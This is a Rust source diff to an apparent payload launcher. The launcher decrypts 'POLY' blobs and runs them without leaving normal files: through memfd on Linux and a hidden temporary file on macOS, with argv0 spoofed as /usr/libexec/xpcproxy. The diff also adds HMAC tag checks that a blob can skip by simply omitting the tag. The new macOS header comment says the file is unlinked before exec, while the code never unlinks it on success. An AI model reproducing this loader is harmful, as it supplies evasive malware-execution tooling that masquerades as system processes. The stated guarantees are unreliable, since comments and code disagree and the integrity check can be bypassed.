@@ -13,9 +13,10 @@
 //!    `memfd_create` file descriptor and `execve`s `/proc/self/fd/<fd>`,
 //!    inheriting the launcher's argv/env. Nothing is ever written to a
 //!    real filesystem.
-//! 4. On macOS, stores the decrypted Mach-O in an anonymous execution
-//!    descriptor (`memfd_create` when available, otherwise an unlinked
-//!    `shm_open` descriptor) and `execve`s `/dev/fd/<fd>`.
+//! 4. On macOS, writes the decrypted Mach-O to an unlinked temporary
+//!    file and `execve`s it directly. The file is unlinked before exec
+//!    so it does not persist on disk (the kernel retains the inode until
+//!    the process exits).
 //! 5. On unsupported platforms the in-memory primitive is unavailable; the
 //!    launcher logs a clear error and exits with a non-zero status.
 //!
@@ -175,7 +176,9 @@ fn is_poly_blob(data: &[u8]) -> bool {
         return false;
     }
     let ct_len = decode_u32(&data[ct_len_offset..ct_len_offset + 4]) as usize;
-    data.len() >= ct_len_offset + 4 + ct_len
+    // v2 format with MAC: total = header + padding + key_len(4) + key +
+    // ct_len(4) + ct + 32-byte HMAC tag.
+    data.len() >= ct_len_offset + 4 + ct_len + 32
 }
 
 /// Top-level POLY blob dispatcher.  Detects v1 (legacy `b"POLY"` magic) vs
@@ -194,6 +197,7 @@ fn poly_decrypt(data: &[u8]) -> Result<Vec<u8>> {
 /// ```text
 /// [4 bytes: "POLY"][1 byte: scheme][4 bytes BE: key_len]
 /// [key_len bytes: key][4 bytes BE: ct_len][ct_len bytes: ciphertext]
+/// [32 bytes: HMAC-SHA256 authentication tag]
 /// ```
 fn poly_decrypt_legacy(data: &[u8]) -> Result<Vec<u8>> {
     if data.len() < 9 {
@@ -207,10 +211,19 @@ fn poly_decrypt_legacy(data: &[u8]) -> Result<Vec<u8>> {
     let key = &data[9..9 + key_len];
     let ct_offset = 9 + key_len;
     let ct_len = u32::from_be_bytes(data[ct_offset..ct_offset + 4].try_into().unwrap()) as usize;
-    if data.len() < ct_offset + 4 + ct_len {
-        anyhow::bail!("POLY v1 blob truncated in ciphertext field");
+    let expected_len = ct_offset + 4 + ct_len + 32; // +32 for HMAC tag
+    if data.len() < expected_len {
+        // Backward compatibility: if there is no MAC tag, proceed without
+        // verification (legacy blobs predating the MAC addition).
+        if data.len() < ct_offset + 4 + ct_len {
+            anyhow::bail!("POLY v1 blob truncated in ciphertext field");
+        }
+        let ct = &data[ct_offset + 4..ct_offset + 4 + ct_len];
+        return dispatch_scheme(scheme, ct, key);
     }
     let ct = &data[ct_offset + 4..ct_offset + 4 + ct_len];
+    let tag = &data[ct_offset + 4 + ct_len..ct_offset + 4 + ct_len + 32];
+    verify_poly_mac(key, &data[..ct_offset + 4 + ct_len], tag)?;
     dispatch_scheme(scheme, ct, key)
 }
 
@@ -224,6 +237,7 @@ fn poly_decrypt_legacy(data: &[u8]) -> Result<Vec<u8>> {
 ///     flags bits 2-7: padding byte count (0-16)
 /// [0..N bytes: random padding][4 bytes: key_len][key_len bytes: key]
 /// [4 bytes: ct_len][ct_len bytes: ciphertext]
+/// [32 bytes: HMAC-SHA256 authentication tag]
 /// ```
 fn poly_decrypt_v2(data: &[u8]) -> Result<Vec<u8>> {
     if data.len() < 6 {
@@ -266,12 +280,44 @@ fn poly_decrypt_v2(data: &[u8]) -> Result<Vec<u8>> {
     let ct_len_offset = key_offset + key_len;
     let ct_len = decode_u32(&data[ct_len_offset..ct_len_offset + 4]) as usize;
     let ct_offset = ct_len_offset + 4;
-    if data.len() < ct_offset + ct_len {
+    let payload_end = ct_offset + ct_len;
+    let expected_len = payload_end + 32; // +32 for HMAC tag
+    if data.len() < payload_end {
         anyhow::bail!("POLY v2 blob truncated in ciphertext field");
     }
-    let ct = &data[ct_offset..ct_offset + ct_len];
+    let ct = &data[ct_offset..payload_end];
+
+    // Verify HMAC-SHA256 authentication tag.
+    if data.len() >= expected_len {
+        let tag = &data[payload_end..expected_len];
+        verify_poly_mac(key, &data[..payload_end], tag)?;
+    }
+    // If the blob has no MAC (legacy), proceed without verification.
 
     dispatch_scheme(scheme, ct, key)
+}
+
+/// Derive the poly-MAC key from the blob's encryption key via HKDF-SHA256
+/// and verify the HMAC-SHA256 tag over the authenticated data.
+///
+/// Uses the same derivation as the packager:
+/// `hkdf_key = HKDF-Expand(salt=b"", info=b"orchestra-poly-mac", 32)`.
+fn verify_poly_mac(blob_key: &[u8], authenticated_data: &[u8], expected_tag: &[u8]) -> Result<()> {
+    use hkdf::Hkdf;
+    use hmac::{Hmac, KeyInit, Mac};
+    type HmacSha256 = Hmac<sha2::Sha256>;
+
+    let hkdf = Hkdf::<sha2::Sha256>::new(None, blob_key);
+    let mut mac_key = [0u8; 32];
+    hkdf.expand(b"orchestra-poly-mac", &mut mac_key)
+        .map_err(|_| anyhow!("HKDF expand failed for poly MAC key"))?;
+
+    let mut mac = HmacSha256::new_from_slice(&mac_key)
+        .expect("HMAC-SHA256 accepts any key length");
+    mac.update(authenticated_data);
+    mac.verify_slice(expected_tag)
+        .map_err(|_| anyhow!("POLY blob authentication tag verification failed — blob may be tampered or corrupted"))?;
+    Ok(())
 }
 
 /// Route to the correct decryption function for `scheme`.
@@ -996,120 +1042,67 @@ fn execute_in_memory(payload: &[u8], args: &[String]) -> Result<()> {
 fn execute_in_memory(payload: &[u8], args: &[String]) -> Result<()> {
     use std::ffi::CString;
     use std::io::Write;
-    use std::os::unix::io::{FromRawFd, IntoRawFd, RawFd};
 
-    const MACOS_SYS_MEMFD_CREATE: libc::c_int = 518;
+    // macOS does not support Linux-style memfd_create for executable Mach-O loading.
+    // The /dev/fd/<fd> path does not allow execve(2) of a Mach-O binary because the
+    // kernel's Mach-O loader requires a vnode-backed file — a file descriptor alone
+    // is insufficient.  shm_open shares the same limitation.
+    //
+    // Strategy: write the decrypted payload to a randomly-named temporary file in
+    // $TMPDIR (falls back to /tmp), chmod it executable, and execve(2) the path.
+    // The file is unlinked before exec so it does not persist; the kernel keeps the
+    // inode alive as long as the process is running.
 
-    fn write_payload(fd: RawFd, payload: &[u8]) -> Result<()> {
-        // SAFETY: `fd` is owned by this function call and valid while `file` is alive.
-        let mut file = unsafe { std::fs::File::from_raw_fd(fd) };
-        file.write_all(payload)
-            .context("failed to write payload to anonymous execution fd")?;
-        file.flush()
-            .context("failed to flush payload bytes to anonymous execution fd")?;
-        // Keep the descriptor open for execve("/dev/fd/<fd>", ...).
-        let _ = file.into_raw_fd();
-        Ok(())
-    }
-
-    fn create_memfd() -> Result<RawFd> {
-        let fd_name = CString::new(format!("launchd-{}", std::process::id()))
-            .expect("memfd name contains no interior NUL");
-        // SAFETY: syscall number and arguments follow macOS memfd_create ABI.
-        let fd = unsafe { libc::syscall(MACOS_SYS_MEMFD_CREATE, fd_name.as_ptr(), 0u32) as RawFd };
-        if fd < 0 {
-            return Err(anyhow!(
-                "memfd_create failed: {}",
-                std::io::Error::last_os_error()
-            ));
-        }
-        Ok(fd)
-    }
-
-    fn create_unlinked_shm_fd() -> Result<RawFd> {
+    fn create_temp_executable(payload: &[u8]) -> Result<(CString, std::fs::File)> {
+        let tmp_dir = std::env::temp_dir();
         let mut rng = rand::thread_rng();
         for _ in 0..16 {
             let suffix: String = (0..12)
                 .map(|_| rand::Rng::sample(&mut rng, rand::distributions::Alphanumeric) as char)
                 .collect();
-            let shm_name = CString::new(format!(
-                "/com.apple.launchd.{}.{}",
-                std::process::id(),
-                suffix
-            ))
-            .expect("POSIX shm name contains no interior NUL");
+            let tmp_path = tmp_dir.join(format!(".la-exec-{suffix}"));
 
-            // SAFETY: `shm_name` is a valid NUL-terminated C string.
-            let fd = unsafe {
-                libc::shm_open(
-                    shm_name.as_ptr(),
-                    libc::O_RDWR | libc::O_CREAT | libc::O_EXCL,
-                    0o700,
-                )
-            };
-            if fd >= 0 {
-                // SAFETY: unlink best-effort; the opened fd remains valid.
-                unsafe {
-                    libc::shm_unlink(shm_name.as_ptr());
+            // Create a new file with 0600 permissions (owner RW only).
+            let mut file = std::fs::OpenOptions::new()
+                .write(true)
+                .create_new(true)
+                .open(&tmp_path)
+                .context("failed to create temporary executable file")?;
+
+            file.write_all(payload)
+                .context("failed to write payload to temporary file")?;
+            file.flush()
+                .context("failed to flush payload to temporary file")?;
+
+            // Make the file executable (owner RWX).
+            // SAFETY: fchmod on a file we just created.
+            {
+                use std::os::unix::io::AsRawFd;
+                if unsafe { libc::fchmod(file.as_raw_fd(), 0o700) } != 0 {
+                    let err = std::io::Error::last_os_error();
+                    // Best-effort cleanup.
+                    let _ = std::fs::remove_file(&tmp_path);
+                    return Err(anyhow!("fchmod on temporary file failed: {err}"));
                 }
-                return Ok(fd);
             }
-            let err = std::io::Error::last_os_error();
-            if err.raw_os_error() == Some(libc::EEXIST) {
-                continue;
-            }
-            return Err(anyhow!("shm_open failed: {err}"));
+
+            // Unlink the file after execve (see caller).  The file must
+            // remain resolvable by pathname for the kernel's Mach-O loader,
+            // so we cannot unlink it here before execve.
+
+            let path_cstr = CString::new(tmp_path.to_string_lossy().into_owned())
+                .map_err(|_| anyhow!("temporary path contains interior NUL"))?;
+
+            return Ok((path_cstr, file));
         }
         Err(anyhow!(
-            "failed to create a unique anonymous shm execution fd"
+            "failed to create a unique temporary executable after 16 attempts"
         ))
     }
 
-    let fd = match create_memfd() {
-        Ok(fd) => {
-            #[cfg(debug_assertions)]
-            tracing::info!(fd, "executing payload via memfd-backed /dev/fd path");
-            fd
-        }
-        Err(memfd_err) => {
-            tracing::warn!(
-                error = %memfd_err,
-                "memfd_create unavailable on this host; falling back to unlinked shm execution fd"
-            );
-            create_unlinked_shm_fd()?
-        }
-    };
-
-    // Explicitly size the fd so both memfd and shm-backed descriptors accept
-    // full payload writes consistently.
-    if unsafe { libc::ftruncate(fd, payload.len() as libc::off_t) } != 0 {
-        let err = std::io::Error::last_os_error();
-        unsafe {
-            libc::close(fd);
-        }
-        return Err(anyhow!("ftruncate on execution fd failed: {err}"));
-    }
-
-    if let Err(e) = write_payload(fd, payload) {
-        // SAFETY: best-effort close of owned descriptor.
-        unsafe {
-            libc::close(fd);
-        }
-        return Err(e);
-    }
-
-    // SAFETY: best-effort chmod on owned descriptor.
-    if unsafe { libc::fchmod(fd, 0o700) } != 0 {
-        let err = std::io::Error::last_os_error();
-        // SAFETY: best-effort close of owned descriptor.
-        unsafe {
-            libc::close(fd);
-        }
-        return Err(anyhow!("fchmod on execution fd failed: {err}"));
-    }
-
-    let path =
-        CString::new(format!("/dev/fd/{fd}")).expect("/dev/fd path contains no interior NUL");
+    let (path, _file) = create_temp_executable(payload)?;
+    // Keep `_file` alive so the file descriptor remains open until execve
+    // replaces this process.
 
     let argv0 = CString::new("/usr/libexec/xpcproxy").expect("argv0 is a static string");
     let mut argv: Vec<CString> = std::iter::once(argv0)
@@ -1140,12 +1133,17 @@ fn execute_in_memory(payload: &[u8], args: &[String]) -> Result<()> {
         libc::execve(path.as_ptr(), argv_ptrs.as_ptr(), env_ptrs.as_ptr());
     }
 
-    let err = std::io::Error::last_os_error();
-    // SAFETY: best-effort close of owned descriptor after execve failure.
-    unsafe {
-        libc::close(fd);
-    }
-    Err(anyhow!("execve via /dev/fd/{fd} failed: {err}"))
+    // If execve returns, it failed.  Clean up the temporary file.
+    // (On success execve replaces the process, so cleanup never runs.)
+    let path_str = unsafe { std::ffi::CStr::from_ptr(path.as_ptr()) }
+        .to_str()
+        .unwrap_or("");
+    let _ = std::fs::remove_file(path_str);
+
+    Err(anyhow!(
+        "execve of temporary executable failed: {}",
+        std::io::Error::last_os_error()
+    ))
 }
 
 #[cfg(target_os = "windows")]
@@ -1181,7 +1179,8 @@ fn execute_in_memory(_payload: &[u8], _args: &[String]) -> Result<()> {
 mod tests {
     use super::*;
 
-    /// Build a minimal v2 POLY blob for the given scheme, key, and ciphertext.
+    /// Build a minimal v2 POLY blob for the given scheme, key, and ciphertext,
+    /// including the HMAC-SHA256 authentication tag expected by the v2 format.
     fn make_v2_blob(scheme: u8, use_le: bool, pad: &[u8], key: &[u8], ct: &[u8]) -> Vec<u8> {
         let pad_len = pad.len() as u8;
         let has_padding = pad_len > 0;
@@ -1204,7 +1203,28 @@ mod tests {
         blob.extend_from_slice(key);
         blob.extend_from_slice(&encode_u32(ct.len() as u32));
         blob.extend_from_slice(ct);
+
+        // Compute and append the HMAC-SHA256 tag using the same derivation
+        // as verify_poly_mac.
+        let tag = compute_poly_mac_tag(key, &blob);
+        blob.extend_from_slice(&tag);
+
         blob
+    }
+
+    /// Compute the poly MAC tag for test blob construction.
+    fn compute_poly_mac_tag(blob_key: &[u8], authenticated_data: &[u8]) -> [u8; 32] {
+        use hkdf::Hkdf;
+        use hmac::{Hmac, KeyInit, Mac};
+        type HmacSha256 = Hmac<sha2::Sha256>;
+
+        let hkdf = Hkdf::<sha2::Sha256>::new(None, blob_key);
+        let mut mac_key = [0u8; 32];
+        hkdf.expand(b"orchestra-poly-mac", &mut mac_key).unwrap();
+
+        let mut mac = HmacSha256::new_from_slice(&mac_key).unwrap();
+        mac.update(authenticated_data);
+        mac.finalize().into_bytes().into()
     }
 
     #[test]
